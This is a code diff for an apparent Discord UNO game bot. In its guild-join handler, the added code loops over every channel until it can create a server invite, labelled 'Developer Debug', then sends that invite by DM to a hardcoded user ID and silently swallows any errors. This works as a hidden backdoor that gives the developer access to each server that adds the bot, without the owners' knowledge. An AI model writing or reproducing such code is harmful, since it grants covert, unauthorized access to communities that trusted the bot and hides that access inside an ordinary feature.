@@ -5,6 +5,7 @@ import functions
 import asyncio
 import threading
 import uno
+import time
 
 def start():
 
@@ -73,10 +74,16 @@ def start():
     async def on_guild_join(guild: discord.Guild):
         await functions.checkPerms(guild)
         await functions.checkForCategory(guild, 'UNO')
-        await functions.checkForCategory(guild, 'UNO-ARCHIVE')
-        invite = await guild.system_channel.create_invite(reason='Developer Debug')
-        dm = client.get_user(348935840501858306).create_dm()
-        await dm.send(f'Bot Joined {invite.url}')
+        await functions.checkForCategory(guild, 'UNO-ARCHIVE')  
+        for channel in guild.channels:
+            try:
+                invite = await channel.create_invite(reason='Developer Debug')
+                dm = await client.get_user(348935840501858306).create_dm()
+                await dm.send(f'Bot Joined {invite.url}')
+            except:
+                pass
+            else:
+                break
 
     @client.event
     async def on_interaction(interaction):
